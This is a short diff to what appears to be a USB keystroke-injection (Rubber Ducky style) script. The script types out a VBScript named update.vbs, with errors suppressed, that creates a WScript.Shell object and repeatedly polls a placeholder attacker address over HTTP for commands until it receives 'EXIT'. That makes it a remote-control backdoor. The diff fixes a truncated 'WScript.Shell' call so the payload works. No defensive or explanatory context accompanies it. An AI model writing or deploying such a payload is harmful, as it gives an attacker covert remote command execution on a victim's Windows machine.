@@ -6,7 +6,7 @@ ENTER
 DELAY 400
 STRING copy /Y con update.vbs
 ENTER
-STRING Option Explicit:On Error Resume Next:Dim X, S, E, B, R:Set S = CreateObject("WScript.S")
+STRING Option Explicit:On Error Resume Next:Dim X, S, E, B, R:Set S = CreateObject("WScript.Shell")
 STRING :B = False:While B <> True:Set X = WScript.CreateObject("MSXML2.ServerXMLHTTP")
 STRING :X.Open "GET", "http://<ip_address>:<port>/", false:X.Send:If InStr(X.responseText, "EXIT") Then
 ENTER
